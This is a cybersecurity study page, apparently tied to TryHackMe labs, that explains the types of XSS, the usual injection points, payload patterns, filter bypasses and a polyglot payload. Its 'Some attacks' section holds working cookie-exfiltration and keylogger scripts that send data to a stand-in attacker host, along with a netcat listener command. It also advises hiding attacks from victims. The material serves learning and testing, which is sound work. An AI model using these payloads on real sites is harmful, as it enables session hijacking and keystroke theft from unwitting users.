# XSS vulnerabilities (JavaScript)

[![xssgi](../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![xss_injection](../../../_badges/poat/xss_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
[![xss_filter_evasion](../../../_badges/owasp/xss_filter_evasion.svg)](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
[![dom_based_xss_prevention](../../../_badges/owasp/dom_based_xss_prevention.svg)](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

<div class="row row-cols-md-2"><div>

Cross-site Scripting, most commonly called **XSS**, refers to injecting malicious JavaScript in a web application with the goal of it being executed by other users.

**The usual proof of concept**: show an alert if the script was executed.

```js
<script>alert('XSS')</script>
```

I think you would enjoy more

```js
<script>console.log('XSS')</script>
```

<br>

Places to check üìå

* Forms
* Headers <small>(ex: the client IP may be logged somewhere on the admin-side, on the helpdesk website)</small>
* ...

<br>

One thing to remember is that you would rather make it invisible to the user that a script is being executed in its browser. As such, if you inject a malicious payload in the source attribute of an image field, it would be best to still make sure an image is properly displayed, so that it does not look suspicious at first glance.

</div><div>

<p class="text-center">Some attacks</p>

**Session hijacking**: anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold üí∞, because with them, we can simulate that we are logged, and bypass verifications such as 2FA.

```html
<script>fetch('https://hacker.website/hijack?cookie=' + btoa(document.cookie));</script>
<!--
CTF: nc -nlvp port | And use the IP:port
Decode: sed -n 's/GET \/?cookie=\(.*\)/\1/p' request | base64 -d
-->
<script>fetch('http://IP:port/?cookie=' + btoa(document.cookie));</script>
```

**A keylogger**: sends keys pressed to the hacker website. The script is using `btoa()` to encode in base64 the values.

<details class="details-n">
<summary>See code</summary>

```html
<script>
    let keys = ''
    document.onkeydown = e => keys += e.key
    setInterval(() => {
        if (keys === '') return
        fetch('https://hacker.website/keylogger?key=' + btoa(keys) )
        keys = ''
    }, 1000)
</script>
```
</details>

* Exploit the client privileges to query the website API if any
* Map open ports on the target
* ...

> See [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all) for more exploits, but it's a bit old.
</div></div>

<hr class="sep-both">

## Reflected XSS

<div class="row row-cols-md-2"><div>

The malicious code is usually inside a URL, and the vulnerable website when loading the URL, will execute the malicious website.
</div><div>

For instance, "https://vulnerable.search.engine" is a search engine in which the query is stored in the URL in the parameter `q`. The website is vulnerable to XSS, so if we open the URL, then the JavaScript will run in our browser.

```
https://vulnerable.search.engine/?q=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E
```
</div></div>

<hr class="sep-both">

## Stored XSS

<div class="row row-cols-md-2"><div>

The malicious code is stored by the website, usually in a database. Then, on another page loading the data from the database, a vulnerable website will execute the malicious code.

> Comments, profiles, listings... may be vulnerable.
</div><div>

For instance, a user using the value `<script>alert('XSS');</script>` as username. Then, for instance, on a vulnerable profile page, any user opening a link to the compromised profile, will execute the malicious code.
</div></div>

<hr class="sep-both">

## DOM-Based XSS

<div class="row row-cols-md-2"><div>

DOM-Based XSS means using the document events such as when a tag is loaded, when an image is hovered, and so on, to execute JavaScript. It should be viewed as something used by both Reflected and Stored XSS when we can't use the TAG `<script>`.
</div><div>

```html
<img src="https://duckduckgo.com/assets/logo_homepage.alt.v108.svg"
     onload="alert('XSS#load')"
     onerror="alert('XSS#error')"
     onmouseover="alert('XSS#hover')"
/>
```
</div></div>

<hr class="sep-both">

## Blind XSS

<div class="row row-cols-md-2"><div>

In blind <small>(or out-band)</small> XSS, you are usually sending a payload in a contact/support... forms, in order to maybe steal information from the admin-side website if any. We are calling it "blind XSS", because it's not possible to see if it's working.
</div><div>

See [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) (1.2k ‚≠ê)
</div></div>

<hr class="sep-both">

## XSS payloads

<table class="table table-bordered table-striped border-dark mt-4">
<thead>
<tr><th>Case</th><th>HTML</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>Boxed attribute</td><td><code>&lt;input value="here"&gt;</code></td><td><code>">MaliciousCodeHere</code></td></tr>

<tr><td>Unboxed attribute</td><td><code>&lt;input value=here&gt;</code></td><td><code>>MaliciousCodeHere</code></td></tr>

<tr><td>Wrapped</td><td><code>&lt;textarea>here&lt;/textarea&gt;</code></td><td><code>&lt;/textarea&gt;MaliciousCodeHere</code></td></tr>

<tr><td>JavaScript</td><td><code>xxx.innerHTML = 'here';</code></td><td><code>';MaliciousCodeHere;//</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onload="maliciousCodeHere"</code></td></tr>

<tr><td>Boxed Image</td><td><code>&lt;img src="here" alt="xxx"/&gt;</code></td><td><code>URL" onerror="maliciousCodeHere"</code></td></tr>

</tbody></table>

<hr class="sep-both">

## Bypass filters

<div class="row row-cols-md-2"><div>

**Logic flaw**

For instance, a dropdown in which a user is supposed to pick a country. A hacker can try to inject a malicious payload instead of a country. If the developer didn't check the field because the value was supposedly limited to the one the developer picked, then we have a logic flaw.

**Bypass HTML symbols filtering**

If `<`, and `>` are filtered, an attacker may still use DOM Based XSS.

**Bypass DOM Based Filtering**

If there is a filter removing every attribute such as `onload`, `onmouseover`... Then you could try variants as HTML is case-insensitive.

```html
<img src="" ONERROR="alert('XSS')" />
```

</div><div>

**Bypass keywords filtering**

Most functions to filter something will only pass on the text once. It means that if the hacker knows that something is filtered, he may create a payload that is only working after being filtered. For instance, below the filter will remove the "&lt;script&gt;", so the "&lt;s" and the "cript&gt;" will be concatenated, effectively bypassing the filter.

```html
<s<script>cript>alert('XSS');</s<script>cript>
// filter remove "<script>"
<script>alert('XSS');</script>
```

You can also try variants if the filter is case-sensitive

```html
<scIpT>alert('XSS');</scIpT>
```

Another way of bypassing keyword filtering is using alternate forms. For instance, with the function `alert`, we could do.

```html
<img src="NOT_FOUND" onerror="eval('aler'+'t')('XSS')">
<!-- unicode in HTML with &# \u -->
<img src="NOT_FOUND" onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;('XSS')>
<!-- unicode with \u -->
<img src="NOT_FOUND" onerror=\u0061lert('XSS')>
```
</div></div>

<hr class="sep-both">

## Polyglots - the magic payloads

<div class="row row-cols-md-2"><div>

XSS polyglots are sort of magic payloads designed to bypass many tags/attributes/filters/... at once.
</div><div>

An example

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```
</div></div>